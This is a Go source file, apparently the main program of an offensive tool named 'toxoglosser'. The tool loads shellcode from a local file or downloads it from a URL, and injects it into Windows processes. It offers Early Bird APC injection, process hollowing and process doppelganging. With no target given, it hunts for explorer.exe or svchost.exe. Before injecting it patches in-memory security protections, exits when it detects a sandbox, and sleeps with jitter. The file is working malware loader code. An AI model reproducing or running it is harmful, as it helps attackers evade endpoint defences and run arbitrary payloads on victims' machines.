package main

import (
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"runtime"
	"time"

	"toxoglosser/anti"
	"toxoglosser/core"
	"toxoglosser/evasion"
	"toxoglosser/utils"
)

// Shellcode will be loaded from file if not provided via other means
var shellcode []byte

func main() {
	if runtime.GOARCH != "amd64" {
		fmt.Fprintln(os.Stderr, "[-] This tool requires an x64 architecture.")
		os.Exit(1)
	}

	// --- Command-line flag parsing ---
	shellcodeFile := flag.String("file", "", "Path to the shellcode file to execute.")
	shellcodeURL := flag.String("url", "", "URL to fetch the shellcode from.")
	targetProcessName := flag.String("pname", "", "Name of the target process.")
	targetPidFlag := flag.Int("pid", 0, "PID of the target process.")
	injectionTechnique := flag.String("technique", "apc", "Injection technique to use: apc, hollow, doppel")
	delay := flag.Int("delay", 0, "Delay in seconds before execution")
	verbose := flag.Bool("v", false, "Enable verbose output.")

	flag.Parse()

	// Set random seed for any randomization needed
	rand.Seed(time.Now().UnixNano())

	if *verbose {
		fmt.Println("[*] Verbose mode enabled")
	}

	// Perform evasions before payload execution
	if *verbose {
		fmt.Println("[*] Applying in-memory protections bypass...")
	}
	evasion.PatchAll()

	// Perform environment checks
	if *verbose {
		fmt.Println("[*] Performing environment checks...")
	}
	if anti.IsSandboxEnvironment() {
		fmt.Fprintln(os.Stderr, "[-] Sandbox environment detected, exiting")
		os.Exit(1)
	}

	// Apply configurable delay with jitter
	if *delay > 0 {
		if *verbose {
			fmt.Printf("[*] Sleeping for %d seconds with jitter...\n", *delay)
		}
		utils.SleepWithJitter(time.Duration(*delay)*time.Second, 0.1) // 10% jitter
	}

	// --- Payload selection ---
	var payload []byte
	var err error

	if *shellcodeURL != "" {
		fmt.Printf("[*] Downloading payload from URL: %s\n", *shellcodeURL)
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to download shellcode: %v\n", err)
			os.Exit(1)
		}
		defer resp.Body.Close()
		payload, err = ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode from response: %v\n", err)
			os.Exit(1)
		}
	} else if *shellcodeFile != "" {
		fmt.Printf("[*] Loading payload from file: %s\n", *shellcodeFile)
		payload, err = ioutil.ReadFile(*shellcodeFile)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read shellcode file: %v\n", err)
			os.Exit(1)
		}
	} else {
		fmt.Println("[*] Using embedded payload.")
		// Load the embedded shellcode from the current directory
		embeddedPayload, err := ioutil.ReadFile("shell.bin")
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read embedded shellcode: %v\n", err)
			os.Exit(1)
		}
		payload = embeddedPayload
	}

	if len(payload) == 0 {
		fmt.Fprintln(os.Stderr, "[-] No shellcode to execute. Provide a URL, file, or embed one.")
		os.Exit(1)
	}

	// --- Injection based on technique ---
	var injected bool
	switch *injectionTechnique {
	case "apc":
		injected = injectViaAPC(*targetPidFlag, *targetProcessName, payload, *verbose)
	case "hollow":
		injected = injectViaHollow(*targetProcessName, payload, *verbose)
	case "doppel":
		injected = injectViaDoppel(*targetProcessName, payload, *verbose)
	default:
		fmt.Fprintf(os.Stderr, "[-] Unknown injection technique: %s\n", *injectionTechnique)
		os.Exit(1)
	}

	if !injected {
		fmt.Fprintln(os.Stderr, "[-] Injection failed. No suitable target process was found or could be injected into.")
		os.Exit(1)
	}

	if *verbose {
		fmt.Println("[+] Injection completed successfully")
	}
}

func injectViaAPC(targetPid int, targetProcessName string, payload []byte, verbose bool) bool {
	var pid uint32
	
	if targetPid != 0 {
		// Target a specific PID
		pid = uint32(targetPid)
		if verbose {
			fmt.Printf("[+] Using PID: %d\n", pid)
		}
	} else if targetProcessName != "" {
		// Target a specific process name
		foundPid := findProcessByName(targetProcessName)
		if foundPid == 0 {
			fmt.Fprintf(os.Stderr, "[-] Could not find process '%s'.\n", targetProcessName)
			return false
		}
		pid = foundPid
		if verbose {
			fmt.Printf("[+] Found target process '%s' with PID: %d\n", targetProcessName, pid)
		}
	} else {
		// Hunt for a suitable process from a default list
		if verbose {
			fmt.Println("[*] No target specified. Hunting for a suitable process...")
		}
		defaultTargets := []string{"explorer.exe", "svchost.exe", "services.exe", "spoolsv.exe"}
		for _, processName := range defaultTargets {
			if verbose {
				fmt.Printf("[*] Hunting for '%s'...\n", processName)
			}
			foundPid := findProcessByName(processName)
			if foundPid != 0 {
				pid = foundPid
				if verbose {
					fmt.Printf("[+] Found suitable process: %s (PID: %d)\n", processName, pid)
				}
				break
			}
		}
	}
	
	if pid == 0 {
		fmt.Fprintln(os.Stderr, "[-] No suitable target process found.")
		return false
	}

	// Perform Early Bird APC injection
	err := core.EarlyBirdInject(pid, payload)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to inject via APC: %v\n", err)
		return false
	}

	if verbose {
		fmt.Printf("[+] Payload injected into process %d via APC injection.\n", pid)
	}
	return true
}

func injectViaHollow(targetProcessName string, payload []byte, verbose bool) bool {
	if targetProcessName == "" {
		targetProcessName = "notepad.exe" // Default target for hollowing
		if verbose {
			fmt.Printf("[*] Using default target for hollowing: %s\n", targetProcessName)
		}
	}

	err := core.ProcessHollow(targetProcessName, payload)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to inject via hollowing: %v\n", err)
		return false
	}

	if verbose {
		fmt.Printf("[+] Payload injected via process hollowing into %s.\n", targetProcessName)
	}
	return true
}

func injectViaDoppel(targetProcessName string, payload []byte, verbose bool) bool {
	if targetProcessName == "" {
		targetProcessName = "notepad.exe" // Default target for doppelganging
		if verbose {
			fmt.Printf("[*] Using default target for doppelganging: %s\n", targetProcessName)
		}
	}

	err := core.ProcessDoppelganging(targetProcessName, payload)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to inject via doppelganging: %v\n", err)
		return false
	}

	if verbose {
		fmt.Printf("[+] Payload injected via process doppelganging into %s.\n", targetProcessName)
	}
	return true
}

// findProcessByName finds the PID of a process by its name
// In a real implementation, this would use Windows APIs
// We'll add a basic implementation using Windows APIs
func findProcessByName(processName string) uint32 {
	// For the purposes of this implementation, we'll use Windows APIs
	// This is a simplified version - a full implementation would require more complex code
	// to enumerate processes using CreateToolhelp32Snapshot, Process32First, Process32Next

	// This is where we'd implement the actual process enumeration
	// For now, as a simplified approach in our modular design,
	// we'll call a function from the core package
	return core.GetProcessIdByName(processName)
}